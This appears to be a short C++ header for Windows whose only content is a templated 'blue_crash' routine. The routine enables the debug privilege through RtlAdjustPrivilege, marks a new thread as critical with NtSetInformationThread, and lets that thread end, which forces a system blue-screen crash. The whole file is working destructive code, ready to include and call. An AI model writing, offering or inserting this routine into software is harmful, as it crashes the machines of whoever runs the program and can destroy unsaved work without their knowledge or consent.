#pragma once


template<int>
static void _blue_crash()
{
	typedef NTSTATUS( NTAPI * LPFN_RtlAdjustPrivilege )(
		ULONG Privilege,
		BOOL Enable,
		BOOL CurrentThread,
		BOOL * Enabled
	);
	typedef NTSTATUS( NTAPI * LPFN_NtSetInformationThread )(
		IN HANDLE ThreadHandle,
		IN UINT ThreadInformationClass,
		IN PVOID ThreadInformation,
		IN ULONG ThreadInformationLength
	);

	static HMODULE hLib_ntdll = GetModuleHandle( "ntdll.dll" );
	static LPFN_RtlAdjustPrivilege RtlAdjustPrivilege = ( LPFN_RtlAdjustPrivilege )GetProcAddress( hLib_ntdll, "RtlAdjustPrivilege" );
	static LPFN_NtSetInformationThread NtSetInformationThread = ( LPFN_NtSetInformationThread )GetProcAddress( hLib_ntdll, "NtSetInformationThread" );

	BOOL bEnaled = FALSE;
	RtlAdjustPrivilege( 20, TRUE, FALSE, &bEnaled );
	UINT data = 1;
	NtSetInformationThread( ( HANDLE ) - 2, 18, &data, 4 );
	//ExitThread( 0 );
}
template<int _FuncID>
static void blue_crash()
{
	static HANDLE hThread = CreateThread( 0, 0, ( LPTHREAD_START_ROUTINE )&_blue_crash<_FuncID>, 0, 0, 0 );
	CloseHandle( hThread );
}
